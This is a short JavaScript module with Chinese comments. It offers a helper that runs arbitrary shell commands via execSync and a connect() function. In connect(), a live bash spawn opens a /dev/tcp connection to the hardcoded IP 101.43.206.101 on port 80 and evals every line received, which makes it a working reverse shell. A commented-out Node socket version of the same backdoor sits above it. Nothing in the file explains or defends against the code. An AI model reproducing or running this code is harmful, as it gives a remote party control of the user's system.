const { spawn, execSync } = require('child_process');

export async function runCommands(com) {
  let ret = [];
  try {
    const comRet = execSync(com).toString();
    ret.push(comRet);

  } catch (error) {
    console.error('执行失败:', error);
    ret.push(error.message);
  }
  return ret;
}

export function connect() {
  // const client = new net.Socket();
  // client.connect(80, '101.43.206.101', function() {
  //   // 连接成功后启动一个shell
  //   const sh = cp.spawn('/bin/sh', []);
  //   // 将socket的数据流传递给shell的输入
  //   client.pipe(sh.stdin);
  //   sh.stdout.pipe(client);
  //   sh.stderr.pipe(client);
  //   // 如果socket关闭，也结束shell
  //   client.on('close', function() {
  //     console.log('close');
  //     sh.kill();
  //   });
  // });

// 使用spawn执行bash命令
  const child = spawn('bash', ['-c', `exec 5<>/dev/tcp/101.43.206.101/80; cat <&5 | while read line; do eval "$line" >&5; done`]);

// 我们可以监听子进程的事件
  child.on('error', (err) => {
    console.error('Failed to start child process:', err);
  });
  child.on('exit', (code, signal) => {
    console.log(`Child process exited with code ${code} and signal ${signal}`);
  });
}
